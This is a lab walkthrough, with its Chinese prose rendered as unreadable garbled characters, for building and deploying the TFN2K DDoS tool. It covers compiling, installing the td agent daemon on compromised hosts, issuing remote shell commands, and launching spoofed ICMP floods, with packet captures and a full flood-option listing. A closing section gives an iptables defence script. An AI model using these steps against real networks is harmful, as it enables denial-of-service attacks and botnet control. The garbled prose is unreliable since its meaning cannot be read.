��.tfn2k����ԭ��

     1.tfn2k�Ĺ�����ϵ��

      tfn2kӦ������DDOS�����еĴ�������������ʵ�ֵĹ��������Ŀ���࣬̾Ϊ��ֹ...(�����ľ�η�������Ͻ�ˮ����������...)��������

�ļܹ���
     ���ض�---����tfn�ͻ��ˣ���ң�ز�ָ������Ŀ�꣬���Ĺ�������.(����)
     �����---��ֲ�벢����td���̵�����Ʒ������tfn��ָ�ӣ�������ʵʩ��.��Ҫע����ǣ�һ�������ߣ��������ƶ�̨��������ɹ�������

����ϵͳ��Ϊunix,linux��.(����������Ʒ��
     Ŀ������---�����������������磬������DDOS����Yahoo��Amazon��CNN��e-bay��.(�����ܺ��ߣ���������)
  
     2.tfn2k���ԡ�  
       ���� ���ض�ͨ��TCP��UDP��ICMP�������ʹ������֮һ(Ĭ��.���)�����ݰ�������������������,������������TCP/SYN��UDP��

ICMP/PING����Ϲ�����TARGA3�ȡ�
         �� ���ض������˵�ͨѶ��ȡ���򣬼����ض�ֻ�����˷���������һ��ȡ�����ͷ��Ϣ�����������Դ��ַ��Ϣ,����˲���

���������ض˷����κ���Ϣ.
         �� ���������CAST-256�㷨����,��ؼ��ּ��������ʱ������Ŀ���.�������������ΪΨһ��֤ƾ֤.
         �� ����td���̣����ض˿���Զ��ִ��shell����.
         �� td���̵����ƿ����ڱ���ʱ����,����������.
         �� tfn���Ա���������win32��linuxϵͳ��.
          ...
         ����α��ԴIP��ַ�ȹ��ܣ����ǻ������ܣ����������ϰ汾��tfn��ȣ����ķ���Ч�ʸ��ߣ������ѵĲ��ԣ��ڶ̶̲���5���ӣ���̨

�������ʹ�ҵ�redhat linux 9.0ϵͳ̱��.

��.tfn2k ʵս����
    1.���Ի���:  
       �����redhat linux 9.0
       Ӳ��ƽ̨��  
          master:  
                IP: 192.168.0.6
               PIV2.4/256*2/rtl8139  
          Ag1 :  
                IP: 192.168.0.2
               PIV2.4/256*/rtl8139
          AG2 : IP: 192.168.0.3
               pIV2.6/512*2/3c905
          AIM: 192.168.0.5
               pIV2.66c/512*2/3c905
          switch: D_link des 1024R              

    1.����tfn2k.tgz(��Ϊ������Ǳ�Ѱ���������Ҳ����ṩ���ص�ַ���������Ȥ�����ѵ������Ұ�)
    2.��ѹ�� tar zxvf tfn2k.tgz  
    3.�޸��ļ�
       A. src/Makefile ������ϵͳ��linuxϵͳ������Ҫ���κ��޾Ϳ��ԣ������win32ϵͳ���뽫
            # Linux / *BSD* / Others
             CC = gcc
             CFLAGS = -Wall -O3
             CLIBS =
          �⼸��ע�͵�,����
            # Win32 (cygwin)
            #CC = gcc
            #CFLAGS = -Wall -DWINDOZE -O2
            #CLIBS =
         �⼸�е�ע��ȥ��.��Ϊ�ҵĲ���ϵͳΪredhat linux 9.0���Բ�δ���κ��޸�.

        B. src/config.h ��Ĭ�ϵľͿ����ã��������Ȥ����������ע����Ϣ���е�����
  
        C. src/ip.h   ����Ҫ��һЩ�޸ģ����������д��󣬷����ظ����塣
           /*struct in_addr
             {
              unsigned long int s_addr;
           };*/
           ע�Ⱑ~~�ҿ��ǽ�������"/*   */"֮�䣬Ҳ����ע�͵���:)
        
         D.���ı�������
           ��Ϊtfn2k֧�ֵ���egcs-1.1.2-30,��redhat linux 9.0����������gcc-3.2.2-5,����������滻��gcc��tfn2k�Ǳ��벻��ȥ��.��

Ҫע����ǣ�����֮���п��ܻ���ɻ���gcc3.2.2��������벻ȥ,���������.
        �����ܼ򵥵ģ��ҵ�һ��redhat linux 6.2��װ��,��egcs-1.1.2-30.rpm��cpp-1.1.2-30.rpm����~/
        cd /mnt/cdrom/Redhat/RPMS
        cp egcs-1.1.2-30* cpp-1.1.2-30* ~/
        ��װcpp     rpm -Uvh --nodeps --oldpackage cpp-1.1.2-30.i386.rpm  
        ��װegcs    rpm -Uvh egcs-1.1.2-30.i386.rpm (�����ʾ������nodeps��oldpackages��ignoreos�Ȳ������Թ�ȥ�����ˣ�
  
     4.����tfn2k
        cd tfn2k/src  
        make  
        ���Ȼ�̸��һ���������������ܣ�֮�����ʾ����8-32λ����,ǰ���ᵽ��������Ψһ����֤ƾ֤���ᱻ�ַ���td�����У�����һ��

Ҫ������~��
        ����ͨ���󣬻����td��tfn������Ǵ���������tfn2k��~,td���ػ����̣�������װ�ڴ����еģ���tfn���ǿ��ƶ�.

      5.��װtd.
        ��td�ϴ����ҵ���̨����,ag1(192.168.0.2)��ag2(192.168.0.3) ����Ϊ��ֻ�������ԣ������õ��ǺϷ���root���ϴ���ִ��td���̵�

�������Ҫ�ҵ�����װһ����������ܵ÷ѵ������Ϊû��һ������Ա��˵��come on baby ~~.�Ҹ���root,����װtd������ɡ�
      [root@test /] ftp 192.168.0.2
            Connected to 192.168.0.2.
            530 Please login with USER and PASS.
            530 Please login with USER and PASS.
            Name (192.168.0.2:root): wjpfjy
            331 Please specify the password.
            Password:
            230 Login successful. Have fun.
            Remote system type is UNIX.  
            Using binary mode to transfer files.
         ftp>; put td (�ϴ�td)
           local: td remote: td
           227 Entering Passive Mode (192,168,0,3,198,225)
           553 Could not create file.
         ftp>; by (�˳�ftp)    
          221 Goodbye.
      [root@test /]ssh 192.168.0.2 ��½��ag1 ��ִ��td ,ע�⣬���õ���root�ʻ������������㹻��Ȩ����ִ����.
              root@192.168.0.2's password:  
              Last login: Tue Feb 24 06:51:13 2004
      [root@ ag1 /]find / -name td -print �ҵ����ϴ��������ļ�td.
      [root@ ag1 wjpfjy/]chmod a+x td      ʹ֮����ִ��Ȩ��.
      [root@ ag1 wjpfjy/]./td              ����td ���������ӵ��һ�������ˣ��������Ψ���Ǵӵ�:(��
������
������ͬ���ķ�����ag2 (192.168.0.3)�ϰ�װ������TFN2k����td.
     
     6.������ʼ(���ҵĻ���������...)
       �ص�master(192.168.0.6 )��׼������...
������[root@master root]#touch host.txt     ���������¼�ļ�(��Ϊ������㹻���ĵĻ����п��ܻὨ���ܶ���⼦�����������»���

�ǵ���.)  
       [root@master root]echo "192.168.0.2" >; host.txt ��ִ�й�td��ag1����host.txt��
������[root@master root]echo "192.168.0.3" >;>; host.txt ���ag2��host.txt .
��������������һ�����ӡ�
������[root@master root]./tfn -f host.txt -c 10 -i "mkdir wjpfjy"   ��host.txt�еĴ���ͨѶ������ִ������mkdir wjpfjy������һ��

Ŀ¼
��      Protocol       : random
         Source IP      : random
         Client input   : list
         Command        : execute remote command

������Password verification:������������ᱻ��ʾ�������룬Ҳ���Ǳ���ʱ���������,������ˣ����޷���td����ͨѶ

������Sending out packets: ..

    ��ag1��ag2������û�н���Ŀ¼��wjpfjy��һ�������,�������td��ͬһĿ¼,�����ȷ����������find / -name wjpfjy -print������    
����
������[root@master root]./tfn -f host.txt -c 6 -i 192.168.0.5����ʼICMP/PING ����aim...(�����ҵ�P4��������5����,�͸�386һ����

)����������game overǰ�����Ǻܼ����ļ�¼���˹�������,Ҳ���ǶԵ�ס����NK������.����tcpdump��ץ����¼.
       [root@aim root]# tcpdump -r pack.atta -c 4 -xX
08:03:36.524907 23.43.171.0 >; 192.168.0.5 icmp: echo request [ttl 0]
0x0000    4500 005c 659d 0000 0001 d22e 172b ab00         E..\e........+..
0x0010    c0a8 0002 0800 f7ff 0000 0000 0000 0000         ................
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0050    0000                                            ..
08:03:36.524933 192.168.0.5 >; 23.43.171.0: icmp: echo reply
0x0000    4500 005c a5d5 0000 4001 51f6 c0a8 0002         E..\....@.Q.....
0x0010    172b ab00 0000 ffff 0000 0000 0000 0000         .+..............
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0050    0000                                            ..
08:03:36.524944 36.235.130.0 >; 192.168.0.5: icmp: echo request [ttl 0]
0x0000    4500 005c 659d 0000 0001 ed6e 24eb 8200         E..\e......n$...
0x0010    c0a8 0002 0800 f7ff 0000 0000 0000 0000         ................
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0050    0000                                            ..
08:03:36.524984 192.168.0.5 >; 36.235.130.0: icmp: echo reply
0x0000    4500 005c 551c 0000 4001 bdef c0a8 0002         E..\U...@.......
0x0010    24eb 8200 0000 ffff 0000 0000 0000 0000         $...............
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
��    
��[root@master root]./tfn -f host.txt -c 0 ֹͣ����

         Protocol       : random
         Source IP      : random
         Client input   : list
         Command        : stop flooding

Password verification:

Sending out packets: ...

��Ȼ���б�Ĺ�����������ֻҪ��-c X�Ϳ��Ը��Ĺ�������.

    [root@master root]./tfn    
      usage: ./tfn <options>;
[-P protocol]    Protocol for server communication. Can be ICMP, UDP or TCP.
                 Uses a random protocol as default
[-D n]           Send out n bogus requests for each real one to decoy targets
[-S host/ip]     Specify your source IP. Randomly spoofed by default, you need
                 to use your real IP if you are behind spoof-filtering routers
[-f hostlist]    Filename containing a list of hosts with TFN servers to contact
[-h hostname]    To contact only a single host running a TFN server
[-i target string]       Contains options/targets separated by '@', see below
[-p port]                A TCP destination port can be specified for SYN floods
<-c command ID>; 0 - Halt all current floods on server(s) immediately
                 1 - Change IP antispoof-level (evade rfc2267 filtering)
                     usage: -i 0 (fully spoofed) to -i 3 (/24 host bytes spoofed)
                 2 - Change Packet size, usage: -i <packet size in bytes>;
                 3 - Bind root shell to a port, usage: -i <remote port>;
                 4 - UDP flood, usage: -i victim@victim2@victim3@...
                 5 - TCP/SYN flood, usage: -i victim@... [-p destination port]
                 6 - ICMP/PING flood, usage: -i victim@...
                 7 - ICMP/SMURF flood, usage: -i victim@broadcast@broadcast2@...
                 8 - MIX flood (UDP/TCP/ICMP interchanged), usage: -i victim@...
                 9 - TARGA3 flood (IP stack penetration), usage: -i victim@...
                 10 - Blindly execute remote shell command, usage -i command


��.���ذ취
    ����ͬ�������н���DDOS������һ����DDOS����ʤ�����������÷���ǽ���˵�����icmp�����������ҵ�����������ʵ�ֵģ�ֻ���ҵ�������

�����������.��������ָ��������DDOS,Ҫ�ܷ�����Ҳ���ò�˯����:(
���������Ǿ��ϻ������������ģ����Ǿ��������ǵ���������Ϊ���˹����Ĵ�������intranet �ڳ��еİ������ϸ����ƣ�������ȥΣ������

��ֻҪ��Ҷ������������ǵ����绷���ſ��԰�ȫһЩ�����٣��ҿ��԰���˯�����.
  
�����ҷ���ǽ��һ����.��Ҫ�����ICMP/PING�ģ������ô���̫��:(



/sbin/iptables -P INPUT DROP
/sbin/iptables -A INPUT -i lo -p all -j ACCEPT
/sbin/iptables -A INPUT -i eth1 -p icmp -j ACCEPT
/sbin/iptables -A INPUT -p icmp --icmp-type 8 -j DROP
/sbin/iptables -A INPUT -s 127.0.0.2 -i lo -j ACCEPT
/sbin/iptables -A INPUT -s 127.0.0.2 -i eth0 -j DROP
/sbin/iptables -A INPUT -s $LAN_NET/24 -i eth0 -j DROP
/sbin/iptables -A INPUT -s 172.16.0.0/12 -i eth0 -j DROP
/sbin/iptables -A INPUT -s 10.0.0.0/8 -i eth0 -j DROP
/sbin/iptables -A INPUT -i eth0 -m limit --limit 1/sec --limit-burst 5 -j ACCEPT/sbin/iptables -A INPUT -i eth0 -p udp -m  

state --state NEW -j REJECT
/sbin/iptables -A INPUT -p tcp --dport 22 -j ACCEPT
/sbin/iptables -A INPUT -p tcp --dport 80 -j ACCEPT
/sbin/iptables -A INPUT -p tcp -i eth1 --dport 53 -j ACCEPT
/sbin/iptables -A INPUT -p udp -i eth1 --dport 53 -j ACCEPT
/sbin/iptables -A INPUT -p tcp -i eth0 -m state --state ESTABLISHED,RELATED -m tcp --dport 1024: -j ACCEPT
/sbin/iptables -A INPUT -p udp -i eth0 -m state --state ESTABLISHED,RELATED -m udp --dport 1024: -j ACCEPT
/sbin/iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-level 2
/sbin/iptables -A INPUT -i eth0 -p icmp --icmp-type echo-request -j DROP
/sbin/iptables -A INPUT -p tcp -m multiport --destination-port 135,137,138,139 -j LOG
/sbin/iptables -A INPUT -p udp -m multiport --destination-port 135,137,138,139
-j LOG
/sbin/iptables -A INPUT -i eth0 -p tcp --dport 2000 -j ACCEPT
/sbin/iptables -A INPUT -i eth0 -p tcp --dport 2001 -j ACCEPT
/sbin/iptables -A INPUT -p tcp -i eth1 -m state --state ESTABLISHED,RELATED -m tcp --dport 1024: -j ACCEPT


������ֻ���Ҹ��˵�һЩ�������飬��������֮��������ָ֤����������Է�ֹDDOS��Ҳ�������:) 